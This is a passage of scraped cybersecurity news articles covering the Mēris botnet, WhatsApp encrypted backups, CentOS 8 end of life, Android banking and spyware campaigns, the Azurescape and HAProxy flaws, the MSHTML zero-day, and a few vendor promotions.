vulnerabilities impacting the devices.\n\n“Unfortunately, closing the vulnerability does not immediately protect these routers. If somebody got your password in 2018, just an upgrade will not help. You must also change password, re-check your firewall if it does not allow remote access to unknown parties, and look for scripts that you did not create,“ it noted.\nMēris has also been linked to a number of DDoS attacks, including that mitigated by Cloudflare, noting the overlaps in “durations and distributions across countries.“\nWhile it’s highly recommended to upgrade MikroTik devices to the latest firmware to combat any potential botnet attacks, organizations are also advised to change their administration passwords to safeguard against brute-force attempts.\n\n\nFound this article interesting?

{'title': 'WhatsApp to Finally Let Users Encrypt Their Chat Backups in the Cloud',
'text': 'WhatsApp on Friday announced it will roll out support for end-to-end encrypted chat backups on the cloud for Android and iOS users, paving the way for storing information such as chat messages and photos in Apple iCloud or Google Drive in a cryptographically secure manner.\nThe optional feature, which will go live to all of its two billion users in the coming weeks, is expected to only work on the primary devices tied to their accounts, and not companion devices such as desktops or laptops that simply mirror the content of WhatsApp on the phones.\nThe development marks an escalation in the growing tussle over encryption technology and meeting law enforcement needs, wherein privacy-preserving technologies have created impenetrable barriers to comply with legal demands to access vast swathes of digital information stored on smartphones and the cloud — a phenomenon referred to as the “going dark“ problem.\nWhile the Facebook-owned messaging platform flipped the switch on end-to-end encryption (E2EE) for personal messages, calls, video chats, and media between senders and recipients as far back as April 2016, the content — should a user opt to back them up on the cloud to enable the transfer of chat history to a new device — wasn’t subjected to the same security protections, making the backups readable by the cloud providers.\n\n“With the introduction of end-to-end encrypted backups, WhatsApp has created an HSM (Hardware Security Module) based Backup Key Vault to securely store per-user encryption keys for user backups in tamper-resistant storage, thus ensuring stronger security of users’ message history,“ the company said in a whitepaper.\n\n“With end-to-end encrypted backups enabled, before storing backups in the cloud, the client encrypts the chat messages and all the messaging data (i.e. text, photos, videos, etc.) that is being backed up using a random key that’s generated on the user’s device,“ it added.\nTo that end, the device-generated key to encrypt the backup is secured with a user-furnished password, which is stored in the vault to permit easy recovery in the event the device gets stolen. Alternatively, users have the option of providing a 64-digit encryption key instead of a password — but in this scenario, the encryption key will have to be stored manually given that it will no longer be sent to the HSM Backup Key Vault.\nThus when an account owner needs access to their backup, it can be done so with the help of the password or the 64-digit key, which, subsequently, is employed to retrieve the encryption key from the backup key vault and decrypt their backups.\n\nThe vault, in itself, is geographically distributed across five data centers and is also responsible for enforcing password verification as well as rendering the key permanently inaccessible after a set threshold for the number of unsuccessful attempts is crossed so as to safeguard against brute-force attacks to retrieve the key by malicious actors.\n\nUnencrypted cloud backups have been a major security loophole using which law enforcement agencies have been able to access WhatsApp chats to gather incriminating evidence pertaining to criminal investigations. In addressing this escape outlet, Facebook is once again setting itself on the warpath with governments across the world, who have decried the company’s decision to introduce E2EE across all of its services.\nFacebook has since adopted E2EE for Secret Conversations on Messenger and recently extended the feature for voice calls and video calls. In addition, the social media giant is planning a limited test of E2EE for Instagram direct messages.\n“WhatsApp is the first global messaging service at this scale to offer end-to-end encrypted messaging and backups, and getting there was a really hard technical challenge that required an entirely new framework for key storage and cloud storage across operating systems,“ said Facebook’s chief executive Mark Zuckerberg in a post.\n\n\nFound this article interesting?

{'title': 'Moving Forward After CentOS 8 EOL',
'text': 'The Linux community was caught unprepared when, in December 2020, as part of a change in the way Red Hat supports and develops CentOS, Red Hat suddenly announced that it’s cutting the official CentOS 8 support window from ten years – to just two, with support ending Dec 31, 2021.\nIt created a peculiar situation where CentOS 7 users that did the right thing and upgraded quickly to CentOS 8 were left using an OS with just a year’s official support remaining – while users of CentOS 7 still get full support until June 30, 2024.\nWorse, the fact that stable releases of CentOS were discontinued in exchange for the rolling-release CentOS Stream means that to secure their workloads most CentOS 8 users have to opt for an entirely different Linux distribution, with just a year to choose, evaluate and implement an alternative.\nRed Hat’s unexpected decision underlined to what degree software users depend on official support windows for their software security. Countless organizations are now left scrambling to secure or replace CentOS 8 – or run the risk of relying on an OS that’s no longer supported, with no official fixes for new vulnerabilities.\nThe free, enterprise-grade Linux OS everyone liked\nWant to run an enterprise-grade Linux OS and do so free of charge, while enjoying an official, predictable support window? That was the deal with CentOS.\nThe CentOS project has its roots in an independent project that produced a 1:1 binary compatible clone of Red Hat Enterprise Linux (RHEL). Every CentOS release was perfectly matched to RHEL – any applications that work on a RHEL release also worked on the matching CentOS release, simple as that.\nCentOS was eventually taken over by Red Hat. Red Hat’s oversight brought some benefits including fixed reliable support windows which, for recent releases, was set to ten years. These support windows really matter: organizations that run thousands of Linux instances require a predictable support window to plan upgrades or migrations.\nAnd that’s why CentOS was such a good deal. CentOS was a free enterprise-grade Linux OS supported by a big enterprise Linux player – including what everyone thought was bullet-proof support commitments.\nCentOS is alive – but the deal is gone\nCentOS is not dead. Red Hat will continue to release new versions of CentOS through CentOS Stream, but it is a rolling release: updates can come at any time, and it will inevitably mean that CentOS Stream is quickly out of sync with the most recent RHEL release.\nPackages intended for a future RHEL release are guaranteed to land in CentOS Stream first before these packages are published into a fixed RHEL release.\nIn other words, users that run CentOS Stream simply won’t know what updates will come their way, and in which ways these upgrades will break binary compatibility with RHEL.\nLosing binary compatibility means users lose the guarantee that an application certified for a RHEL release will work with a matching CentOS release – and for CentOS Stream users, that could happen at any point in time.\nThe fact that CentOS Stream breaks binary compatibility with RHEL complicates the efforts to secure CentOS 8 now that it is unexpectedly end of life. So while CentOS lives on as CentOS Stream, the key characteristics that made CentOS so appealing are now gone.\nWhile it is somewhat understandable that Red Hat may not want to support a free enterprise-grade Linux OS forever, there was a real sting in Red Hat’s announcement last year, as it leaves CentOS 8 users in a tough spot, needing to secure their CentOS 8 workloads rapidly.\nSecuring CentOS 8 fleets is becoming critical\nCentOS 8 support ends in just a few months so there isn’t a lot of time to think about securing CentOS 8 instances. Doing nothing isn’t an option, once Red Hat’s official support for CentOS 8 stops there will be no future bug fixes or patches for new vulnerabilities.\nAn unsupported OS brings significant risks. New vulnerabilities, once in the public domain, can rapidly lead to exploits in the wild. Where an OS is officially supported a vendor patch will quickly fix that problem.\nNot so where official support is discontinued, in which case users are left with a vulnerable OS, unless they try to develop a patch themselves. Given how rapidly new CVEs are reported there is really no acceptable window during which a user can go without the guarantee of official vendor patches.\nIn some use cases, using CentOS 8 past its official support window also creates a compliance risk as some organizations will violate their compliance obligations by relying on an unsupported OS for workloads.\nOptions for securing CentOS 8\nDowngrading to CentOS 7 to obtain a few additional years of support from Red Hat looks like an easy solution but it isn’t – there is no simple way to roll a CentOS 8 instance back to CentOS 7.\nSwitching, and switching right now, is the best way to secure CentOS 8 workloads as it stands. However, rapidly switching is only possible where the alternative distribution is also 1:1 binary compatible with RHEL.\nLess feasible for most organizations is switching to a non-binary compatible Linux alternative – Ubuntu, or Debian perhaps. In some use cases that could be relatively easy, but most CentOS users would need to plan such a migration carefully – and perform it relatively slowly. There just isn’t enough time left to do that.\nDistributions that are binary compatible with CentOS 8\nThere are essentially three workable options. First up is RockyLinux, a 1:1 binary-compatible clone of RHEL launched by one of the CentOS project’s founders – Gregory Kurtzer. RockyLinux successfully published an official release, it’s free to download, and it is binary compatible, so everything that runs on RHEL should run just fine on RockyLinux.\nSimilarly, AlmaLinux is a community-driven project sponsored by CloudLinux. AlmaLinux also released a stable, 1:1 binary compatible clone of RHEL and promises to continue releasing a new edition every time a new RHEL release comes out.\nOracle Linux is the third alternative: it is established, and (currently at least) guarded by similar cast-iron support guarantees from Oracle. Oracle Linux 8 is also 1:1 binary compatible with RHEL 8.\nThere are scripts available to perform in-place migrations between those distributions, so the process itself is not overly complicated. For organizations looking to migrate, test deployments should (have) start(ed) now (long ago).\nBuying time to decide on a CentOS alternative\nFor many CentOS users the news about CentOS dawned relatively recently, and as we outlined – deciding on an alternative and preparing to switch takes time, something that CentOS 8 users don’t have right now.\nAs an alternative to switching away from CentOS 8, users could choose to buy extended lifecycle support from a third party. A good solution will include coverage for critical CentOS 8 bug fixes and any new CVEs for a specified period of time.\nFor example, TuxCare’s extended lifecycle support for CentOS 8 runs into 2025 and promises to deliver patches for vulnerabilities as fast as – if not faster than – the speed at which the CentOS team rolled out updates.\nSubscribing for extended support ensures CentOS 8 workloads remain secure past 2021, including for the new and emerging threats that are so common in today’s cybersecurity environment. Extended support is a simple way to stay compliant with regulatory requirements too.\nSecuring CentOS 8 before Dec 2021 is critical\nUsers that currently rely on CentOS 8 are in a difficult position. There are few viable options to secure CentOS 8 right now, including moving to a binary compatible alternative. These options are not without their complexities, however. What many CentOS 8 users need right now is time.\nOpting into the extended support immediately secures CentOS 8 and is a relatively affordable way to acquire the time to decide on a CentOS alternative that meets your requirements – without the need to perform a rushed migration and incur the associated risks.\nThe only thing that’s not an option is ignoring CentOS 8’s rapid and unexpected end of life. There are considerable costs associated with running an OS past its end of life. We created this calculator to give you a rough estimate of the financial impact it may have. We also analyzed in detail the issues that may arise from having an unsupported OS running inside your IT perimeter.\nFrom Dec 31, 2021 CentOS 8 will become increasingly vulnerable to security threats – and so would any workload that runs on CentOS 8. For many organizations buying extended support may well be the best solution right now.\n\n\nFound this article interesting?

'text': 'A mix of banking applications, cryptocurrency wallets, and shopping apps from the U.S. and Spain are the target of a newly discovered Android trojan that could enable attackers to siphon personally identifiable information from infected devices, including banking credentials and open the door for on-device fraud.\nDubbed S.O.V.A. (referring to the Russian word for owl), the current version of the banking malware comes with myriad features to steal credentials and session cookies through web overlay attacks, log keystrokes, hide notifications, and manipulate the clipboard to insert modified cryptocurrency wallet addresses, with future plans to incorporate on-device fraud through VNC, carry out DDoS attacks, deploy ransomware, and even intercept two-factor authentication codes.\n\nThe malware was discovered in the beginning of August 2021 by researchers from Amsterdam-based cybersecurity firm ThreatFabric.\nOverlay attacks typically involve the theft of confidential user information using malware that overlays its own windows on top of another program. On the other hand, the pilfering of valid session cookies is particularly nasty as it allows the criminals to log in and take over accounts from the users without the need for knowing the banking credentials.\n\n“The second set of features, added in the future developments, are very advanced and would push S.O.V.A. into a different realm for Android malware, making it potentially one of the most advanced bots in circulation, combining banking malware with automation and botnet capabilities,“ ThreatFabric said in a report shared with The Hacker News.\n\nAlthough the malware is believed to be in its nascent stages of development, S.O.V.A.’s developers have been advertising the product on hacking forums, looking to recruit testers to trial the malware on a large number of devices and its bot capabilities. “Not redistribution of Cerberus/Anubis, the bot is written from scratch,“ the forum post read.\n\n“[S.O.V.A.] is still a project in its infancy, and now provides the same basic features as most other modern Android banking malware,“ the researchers said. “However, the author behind this bot clearly has high expectations for his product, and this is demonstrated by the author’s dedication to test S.O.V.A. with third parties, as well as by S.O.V.A.’s explicit feature roadmap.“\n\n\nFound this article interesting?

'text': 'A previously undocumented backdoor that was recently found targeting an unnamed computer retail company based in the U.S. has been linked to a longstanding Chinese espionage operation dubbed Grayfly.\nIn late August, Slovakian cybersecurity firm ESET disclosed details of an implant called SideWalk, which is designed to load arbitrary plugins sent from an attacker-controlled server, gather information about running processes in the compromised systems, and transmit the results back to the remote server.\nThe cybersecurity firm attributed the intrusion to a group it tracks as SparklingGoblin, an adversary believed to be connected to the Winnti (aka APT41) malware family.\n\nBut latest research published by researchers from Broadcom’s Symantec has pinned the SideWalk backdoor on the China-linked espionage group, pointing out the malware’s overlaps with the older Crosswalk malware, with the latest Grayfly hacking activities singling out a number of organizations in Mexico, Taiwan, the U.S., and Vietnam.\n“A feature of this recent campaign was that a large number of targets were in the telecoms sector. The group also attacked organizations in the IT, media, and finance sectors,“ Symantec’s Threat Hunter Team said in a write-up published on Thursday.\nKnown to be active at least since March 2017, Grayfly functions as the “espionage arm of APT41“ that’s notorious for targeting a variety of industries in pursuit of sensitive data by exploiting publicly facing Microsoft Exchange or MySQL web servers to install web shells for initial intrusion, before spreading laterally across the network and install additional backdoors that enable the threat actor to maintain remote access and exfiltrate amassed information.\n\nIn one instance observed by Symantec, the adversary’s malicious cyber activity commenced with targeting an internet reachable Microsoft Exchange server to gain an initial foothold into the network. This was followed by executing a string of PowerShell commands to install an unidentified web shell, ultimately leading to the deployment of the Sidewalk backdoor and a custom variant of the Mimikatz credential-dumping tool that’s been put to use in previous Grayfly attacks.No follow-on activity was observed beyond this point, the company noted.\n“Grayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media,“ the researchers said. “It’s likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks.“\n\n\nFound this article interesting?

'text': 'Microsoft on Wednesday said it remediated a vulnerability in its Azure Container Instances (ACI) services that could have been weaponized by a malicious actor “to access other customers’ information“ in what the researchers described as the “first cross-account container takeover in the public cloud.“\nAn attacker exploiting the weakness could execute malicious commands on other users’ containers, steal customer secrets and images deployed to the platform. The Windows maker did not share any additional specifics related to the flaw, save that affected customers “revoke any privileged credentials that were deployed to the platform before August 31, 2021.“\n\nAzure Container Instances is a managed service that allows users to run Docker containers directly in a serverless cloud environment, without requiring the use of virtual machines, clusters, or orchestrators.\nPalo Alto Networks’ Unit 42 threat intelligence team dubbed the vulnerability “Azurescape,“ referring to how an attacker can leverage the cross-tenant technique to escape their rogue ACI container, escalate privileges over a multitenant Kubernetes cluster, and take control of impacted containers by executing malicious code.\n\nBreaking out of the container, the researchers said, was made possible due to an outdated container runtime used in ACI (runC v1.0.0-rc2), thereby making it possible to exploit CVE-2019-5736 (CVSS score: 8.6) to escape the container and get code execution with elevated privileges on the underlying host.\nMicrosoft said it notified select customers with containers running on the same Kubernetes cluster as that of the malicious container created by Palo Alto Networks to demonstrate the attack. The cluster is said to have hosted 100 customer pods and about 120 nodes, with the company stating it had no evidence bad actors had abused the flaw to carry out real-world intrusions, adding its investigation “surfaced no unauthorized access to customer data.“\n\nThe disclosure is the second Azure-related flaw to come to light in a span of two weeks, the first one being a critical Cosmos database flaw that could have been potentially exploited to grant any Azure user full admin access to other customers’ database instances without any authorization.\n“This discovery highlights the need for cloud users to take a ’defense-in-depth’ approach to securing their cloud infrastructure that includes continuous monitoring for threats — inside and outside the cloud platform,“ Unit 42 researchers Ariel Zelivanky and Yuval Avrahami said. “Discovery of Azurescape also underscores the need for cloud service providers to provide adequate access for outside researchers to study their environments, searching for unknown threats.“\n\n\nFound this article interesting?

{'title': 'Fighting the Rogue Toaster Army: Why Secure Coding in Embedded Systems is Our Defensive Edge',
'text': 'There are plenty of pop culture references to rogue AI and robots, and appliances turning on their human masters. It is the stuff of science fiction, fun, and fantasy, but with IoT and connected devices becoming more prevalent in our homes, we need more discussion around cybersecurity and safety.\nSoftware is all around us, and it’s very easy to forget just how much we’re relying on lines of code to do all those clever things that provide us so much innovation and convenience.\nMuch like web-based software, APIs, and mobile devices, vulnerable code in embedded systems can be exploited if it is uncovered by an attacker. \nWhile it’s unlikely that an army of toasters is coming to enslave the human race (although, the Tesla bot is a bit concerning) as the result of a cyberattack, malicious cyber events are still possible. Some of our cars, planes, and medical devices also rely on intricate embedded systems code to perform key tasks, and the prospect of these objects being compromised is potentially life-threatening.\nMuch like every other type of software out there, developers are among the first to get their hands on the code, right at the beginning of the creation phase. And much like every other type of software, this can be the breeding ground for insidious, common vulnerabilities that could go undetected before the product goes live. \nDevelopers are not security experts, nor should any company expect them to play that role, but they can be equipped with a far stronger arsenal to tackle the kind of threats that are relevant to them. Embedded systems - typically written in C and C++ - will be in more frequent use as our tech needs continue to grow and change, and specialized security training for the developers on the tools in this environment is an essential defensive strategy against cyberattacks. \nExploding air fryers, wayward vehicles… are we in real danger?\nWhile there are some standards and regulations around secure development best practices to keep us safe, we need to make far more precise, meaningful strides towards all types of software security. It might seem far-fetched to think of a problem that can be caused by someone hacking into an air fryer, but it has happened in the form of a remote code execution attack (allowing the threat actor to raise the temperature to dangerous levels), as has vulnerabilities leading to vehicle takeovers. \nVehicles are especially complex, with multiple embedded systems onboard, each taking care of micro functions; everything from automatic wipers, to engine and braking capabilities. Intertwined with an ever-increasing stack of communication technologies like WI-Fi, Bluetooth, and GPS, the connected vehicle represents a complex digital infrastructure that is exposed to multiple attack vectors. And with 76.3 million connected vehicles expected to hit roads globally by 2023, that represents a monolith of defensive foundations to lay for true safety.\nMISRA is a key organization that is in the good fight against embedded systems threats, having developed guidelines to facilitate code safety, security, portability and reliability in the context of embedded systems. These guidelines are a north star in the standards that every company must strive for in their embedded systems projects.\nHowever, to create and execute code that adheres to this gold standard takes embedded systems engineers who are confident - not to mention security-aware - on the tools. \nWhy is embedded systems security upskilling so specific?\nThe C and C++ programming languages are geriatric by today’s standards, yet remain widely used. They form the functioning core of the embedded systems codebase, and Embedded C/C++ enjoys a shiny, modern life as part of the connected device world. \nDespite these languages having rather ancient roots - and displaying similar vulnerability behaviors in terms of common problems like injection flaws and buffer overflow - for developers to truly have success at mitigating security bugs in embedded systems, they must get hands-on with code that mimics the environments they work in. Generic C training in general security practices simply won’t be as potent and memorable as if extra time and care is spent working in an Embedded C context. \nWith anywhere from a dozen to over one hundred embedded systems in a modern vehicle, it’s imperative that developers are given precision training on what to look for, and how to fix it, right in the IDE. \nProtecting embedded systems from the start is everyone’s responsibility\nThe status quo in many organizations is that speed of development trumps security, at least when it comes to developer responsibility. They’re rarely assessed on their ability to produce secure code, but rapid development of awesome features is the marker of success. The demand for software is only going to increase, but this is a culture that has set us up for a losing battle against vulnerabilities, and the subsequent cyberattacks they allow. \nIf developers are not trained, that’s not their fault, and it’s a hole that someone in the AppSec team needs to help fill by recommending the right accessible (not to mention assessable) programs of upskilling for their entire development community. Right at the beginning of a software development project, security needs to be a top consideration, with everyone - especially developers - given what they need to play their part. \nGetting hands-on with embedded systems security problems\nBuffer overflow, injection flaws, and business logic bugs are all common pitfalls in embedded systems development. When buried deep in a labyrinth of microcontrollers in a single vehicle or device, it can spell disaster from a security perspective. \nBuffer overflow is especially prevalent, and if you want to take a deep dive into how it helped compromise that air fryer we talked about before (allowing remote code execution), check out this report on CVE-2020-28592.\nNow, it’s time to get hands-on with a buffer overflow vulnerability, in real embedded C/C++ code. Play this challenge to see if you can locate, identify, and fix the poor coding patterns that lead to this insidious bug:\n[PLAY NOW]\nHow did you do?

{'title': '3 Ways to Secure SAP SuccessFactors and Stay Compliant',
'text': 'The work-from-anywhere economy has opened up the possibility for your human resources team to source the best talent from anywhere. To scale their operations, organizations are leveraging the cloud to accelerate essential HR functions such as recruiting, onboarding, evaluating, and more.\nSAP is leading this HR transformation with its human capital management (HCM) solution, SAP SuccessFactors. Delivering HR solutions from the cloud enables employees and administrators to not only automate typical tasks, such as providing a report on employee attrition, but also allows them to complete these tasks from anywhere and on any device.\nSuccessFactors makes it easy for employees to access what they need. But the wide range of sensitive employee data within SuccessFactors creates additional security and compliance challenges. Whether it’s personal and financial information used for payroll or health information for benefits, you need the right cybersecurity to ensure that sensitive data, even when it leaves your corporate office perimeters. \nCloud security organization Lookout has detailed some of the challenges cloud-based HCM creates and why you need security built specifically for your cloud app.\nWhy you need cloud security for SuccessFactors \n\nThere’s *a lot* of sensitive data in there \nSuccessFactors offers several features that streamline HR operations, such as compensation and benefits — both of which can be complex to secure. With 12 unique modules, SuccessFactors functions like a multi-cloud environment, making it more challenging to control how data is accessed. And because of its breadth of features, the HCM also handles a diverse array of sensitive and private data, such as financial data, protected health information (PHI), and personally identifiable information (PII). \nYou don’t know what’s happening anymore\nJust like any cloud application, SuccessFactors’ end-users and administrators are increasingly using unmanaged devices and networks to connect and sidestep perimeter-based security — which means IT and security teams no longer have visibility into how users are interacting with the app, the risks on their devices, and how they are handling sensitive data. This makes it nearly impossible for security teams to know whether an endpoint contains malware or a user’s account has been compromised.\nLeveraging SuccessFactors provides huge upside for your HR operations but only if it’s secure — a breach could severely damage your brand and violate compliance regulations. With perimeter-based security no longer effective, you need a solution that understands SuccessFactors and can secure it regardless of how people are connecting and the data involved.\n➤ Register for this webinar to learn how to secure SAP SuccessFactors to remain compliant. \nLookout CASB is uniquely built to safeguard SuccessFactors\nLookout is the only CASB in the SAP Store and the only CASB vendor in the SAP integration partner lineup. Lookout has worked closely with SAP to understand how SuccessFactors interacts with users and handles data.\nThree ways that Lookout CASB can uniquely secure SuccessFactors:1 — User behavior monitoring: detect threats and support audits\nDue to the sensitive nature of the data SuccessFactors handles, staying compliant with regulations is key. It’s critical to have a solution in place that understands how its users are interacting with the application, detect malicious activities and provide a paper trail for auditing purposes.\nAs an integration partner, Lookout CASB understands the specifics of how your users normally interact with SuccessFactors. It knows the context by which someone is connecting, such as the risk level of the device used, where they are connecting from, and the type of data they need. With this deep understanding, you are able to restrict or deny access when suspicious behavior is detected, ensuring that your users aren’t accidentally or intentionally compromising your data.\n2 — Safeguard sensitive data and block malware \nWhen it comes to keeping your data safe, having visibility into user behavior is just one piece of the puzzle. It’s just as important to understand how sensitive or malicious a piece of data is across all devices. With this information, you can determine whether to revoke access or block the data from leaking out, whether it is shared online or downloaded.\nLookout CASB can classify data in real-time across all of SuccessFactors’ modules. With a full understanding of the type of data an organization has, you can dynamically restrict access or encrypt on the go to ensure that only the correct people with a low-risk posture can have access.\n3 — Granular and dynamic policy enforcement \nThe difficulty in securing SuccessFactors isn’t just the visibility. You also need a security solution that can fully leverage the user, data, and device telemetry data to enforce policies. In a remote-first environment, there are countless situations an organization needs to account for, such as how a user behaves, the risk levels of their device, what type of network they’re on, and the data they’re looking to access.\nWith a unique understanding of how users interact with SuccessFactors and what data it holds, Lookout enables organizations to customize policies that make the most sense to them. Security teams could simply allow or deny uploading or downloading privileges based on the user’s behavior and the context by which they are connecting. They could also restrict viewing by redacting or watermarking certain sensitive information if the user is on an untrusted network or an unmanaged device. Lookout CASB can also provide remediation instructions to help the user eliminate risks so they could regain access to what they need.\nRecognized by Gartner as an industry-leading solution, Lookout CASB has built-in advanced data security and user and entity behavior analytics.\nREGISTER TODAY for the September 23, 2021 webinar in which our security experts will demonstrate the various ways the Lookout CASB can secure SAP SuccessFactors.\n\n\nFound this article interesting?

'text': 'A critical security vulnerability has been disclosed in HAProxy, a widely used open-source load balancer and proxy server, that could be abused by an adversary to possibly smuggle HTTP requests, resulting in unauthorized access to sensitive data and execution of arbitrary commands, effectively opening the door to an array of attacks.\nTracked as CVE-2021-40346, the Integer Overflow vulnerability has a severity rating of 8.6 on the CVSS scoring system and has been rectified in HAProxy versions 2.0.25, 2.2.17, 2.3.14 and 2.4.4.\nHTTP Request Smuggling, as the name implies, is a web application attack that tampers the manner a website processes sequences of HTTP requests received from more than one user. Also called HTTP desynchronization, the technique takes advantage of parsing inconsistencies in how front-end servers and back-end servers process requests from the senders.\n\nFront-end servers are typically load balancers or reverse proxies that are used by websites to manage a chain of inbound HTTP requests over a single connection and forward them to one or more back-end servers. It’s therefore crucial that the requests are processed correctly at both ends so that the servers can determine where one request ends and the next one begins, a failure of which can result in a scenario where malicious content appended to one request gets added to the start of the next request.\nIn other words, due to a problem arising from how front-end and back-end servers work out the beginning and end of each request by using the Content-Length and Transfer-Encoding headers, the end of a rogue HTTP request is miscalculated, leaving the malicious content unprocessed by one server but prefixed to the beginning of the next inbound request in the chain.\n“The attack was made possible by utilizing an integer overflow vulnerability that allowed reaching an unexpected state in HAProxy while parsing an HTTP request — specifically — in the logic that deals with Content-Length headers,“ researchers from JFrog Security said in a report published on Tuesday.\n\nIn a potential real-world attack scenario, the flaw could be used to trigger an HTTP request smuggling attack with the goal of bypassing ACL (aka access-control list) rules defined by HAProxy, which enables users to define custom rules for blocking malicious requests.\nFollowing responsible disclosure, HAProxy remediated the weakness by adding size checks for the name and value lengths. “As a mitigation measure, it is sufficient to verify that no more than one such [content-length] header is present in any message,“ Willy Tarreau, HAProxy’s creator and lead developer, noted in a GitHub commit pushed on September 3.\nCustomers who cannot upgrade to the aforementioned versions of the software are recommended to add the below snippet to the proxy’s configuration to mitigate the attacks —\nhttp-request deny if { req.hdr_cnt(content-length) gt 1 }\nhttp-response deny if { res.hdr_cnt(content-length) gt 1 }\n\n\nFound this article interesting?

{'title': 'Experts Uncover Mobile Spyware Attacks Targeting Kurdish Ethnic Group',
'text': 'Cybersecurity researchers on Tuesday released new findings that reveal a year-long mobile espionage campaign against the Kurdish ethnic group to deploy two Android backdoors that masquerade as legitimate apps.\nActive since at least March 2020, the attacks leveraged as many as six dedicated Facebook profiles that claimed to offer tech and pro-Kurd content — two aimed at Android users while the other four appeared to provide news for the Kurdish supporters — only to share links to spying apps on public Facebook groups. All the six profiles have since been taken down.\n“It targeted the Kurdish ethnic group through at least 28 malicious Facebook posts that would lead potential victims to download Android 888 RAT or SpyNote,“ ESET researcher Lukas Stefanko said. “Most of the malicious Facebook posts led to downloads of the commercial, multi-platform 888 RAT, which has been available on the black market since 2018.“\n\nThe Slovakian cybersecurity firm attributed the attacks to a group it refers to as BladeHawk.\nIn one instance, the operators shared a Facebook post urging users to download a “new snapchat“ app that’s designed to capture Snapchat credentials via a phishing website. A total of 28 rogue Facebook posts have been identified as part of the latest operation, complete with fake app descriptions and links to download the Android app, from which 17 unique APK samples were obtained. The spying apps were downloaded 1,481 times from July 20, 2020, until June 28, 2021.\n\nRegardless of the app installed, the infection chain culminates in the deployment of the 888 RAT. Originally conceived as a Windows remote access trojan (RAT) for a price tag of $80, new capabilities added to the implant have allowed it to target Android and Linux systems at an added cost of $150 (Pro) and $200 (Extreme), respectively.\nThe commercial RAT runs the typical spyware gamut in that it’s equipped to run 42 commands received from its command-and-control (C&C) server. Some of its prominent functions include the ability to steal and delete files from a device, take screenshots, amass device location, swipe Facebook credentials, get a list of installed apps, gather user photos, take photos, record surrounding audio and phone calls, make calls, steal SMS messages and contact lists, and send text messages.\n\nAccording to ESET, India, Ukraine, and the U.K. account for the most infections over the three-year period starting from August 18, 2018, with Romania, The Netherlands, Pakistan, Iraq, Russia, Ethiopia, and Mexico rounding off the top 10 spots.\nThe espionage activity has been linked directly to two other incidents that came to light in 2020, counting a public disclosure from Chinese cybersecurity services company QiAnXin that detailed a BladeHawk attack with the same modus operandi, with overlaps in the use of C&C servers, 888 RAT, and the reliance on Facebook for distributing malware.\nAdditionally, the Android 888 RAT has been connected to two more organized campaigns — one that involved spyware disguised as TikTok and an information-gathering operation undertaken by the Kasablanca Group.\n\n\nFound this article interesting?

{'title': '[Ebook] The Guide for Speeding Time to Response for Lean IT Security Teams',
'text': 'Most cyber security today involves much more planning, and much less reacting than in the past. Security teams spend most of their time preparing their organizations’ defenses and doing operational work. Even so, teams often must quickly spring into action to respond to an attack.\nSecurity teams with copious resources can quickly shift between these two modes. They have enough resources to allocate to respond properly. Lean IT security teams, however, are more hard-pressed to react effectively. A new guide by XDR provider Cynet (download here), however, argues that lean teams can still respond effectively. It just takes some work. \nFor teams that are resource-constrained, success starts with having a clear plan and putting the tools and infrastructure in place for the organization to follow properly. The guide breaks down the tools, factors, and knowledge that go into optimizing an organization’s time to respond. \nBuilding a successful incident response plan\nToday’s cyber-attacks take hours or less to succeed. Once ransomware is activated, it takes just a few seconds to begin encrypting any file it finds. This makes speed one of the biggest keys to success in mitigating the damage and preventing further attacks. Any delay could be disastrous. \nTo avoid delays from the start – whether they stem from communication issues, lack of defined roles, or simply not knowing what to do – lean organizations must build clear, transparent incident response plans.\nAccording to the guide, a good incident response plan includes these six elements: \nPreparation – building a strong organizational security policy and constantly looking for potential threats. Identification – the ability to identify threats by correlating signals and data from a wide range of sources (from devices to networks) Containment - The ability to quickly find and isolate the malicious attack, both in the short and long terms Eradication – Once a threat is contained and identified, a successful incident response plan will focus on removing it entirely from the environment. Recovery – the ability to quickly return to normalcy and standard operations by restoring affected devices and networks Lessons learned – understanding the attack, its sources, and how to prevent similar strategies from succeeding in the future. \nHaving the right tools \nA good plan is a great start, but it’s not enough by itself. Lean security teams must have the right tools and platforms to help them cover the gaps in their defenses without creating more work and stress. This is where tools such as response automation, advanced detection and response, network security, and threat intelligence come into play. \nMore important, though, is how teams build the right stack to maximize their efforts without getting bogged down in managing a complex system. In terms of speed to response, having tools on a single pane of glass offers the best opportunity to respond quickly to an attack. \nYou can learn more by downloading the guide here. \n\n\nFound this article interesting?

'text': 'Microsoft on Tuesday warned of an actively exploited zero-day flaw impacting Internet Explorer that’s being used to hijack vulnerable Windows systems by leveraging weaponized Office documents.\nTracked as CVE-2021-40444 (CVSS score: 8.8), the remote code execution flaw is rooted in MSHTML (aka Trident), a proprietary browser engine for the now-discontinued Internet Explorer and which is used in Office to render web content inside Word, Excel, and PowerPoint documents.\n“Microsoft is investigating reports of a remote code execution vulnerability in MSHTML that affects Microsoft Windows. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability by using specially-crafted Microsoft Office documents,“ the company said.\n\n“An attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine. The attacker would then have to convince the user to open the malicious document. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights,“ it added.\nThe Windows maker credited researchers from EXPMON and Mandiant for reporting the flaw, although the company did not disclose additional specifics about the nature of the attacks, the identity of the adversaries exploiting this zero-day, or their targets in light of real-world attacks.\nEXPMON, in a tweet, noted it found the vulnerability after detecting a “highly sophisticated zero-day attack“ aimed at Microsoft Office users, adding it passed on its findings to Microsoft on Sunday. “The exploit uses logical flaws so the exploitation is perfectly reliable (& dangerous),“ EXPMON researchers said.\n\nHowever, it’s worth pointing out that the current attack can be suppressed if Microsoft Office is run with default configurations, wherein documents downloaded from the web are opened in Protected View or Application Guard for Office, which is designed to prevent untrusted files from accessing trusted resources in the compromised system.\nMicrosoft, upon completion of the investigation, is expected to either release a security update as part of its Patch Tuesday monthly release cycle or issue an out-of-band patch “depending on customer needs.“ In the interim, the Windows maker is urging users and organizations to disable all ActiveX controls in Internet Explorer to mitigate any potential attack.\n\n\nFound this article interesting?

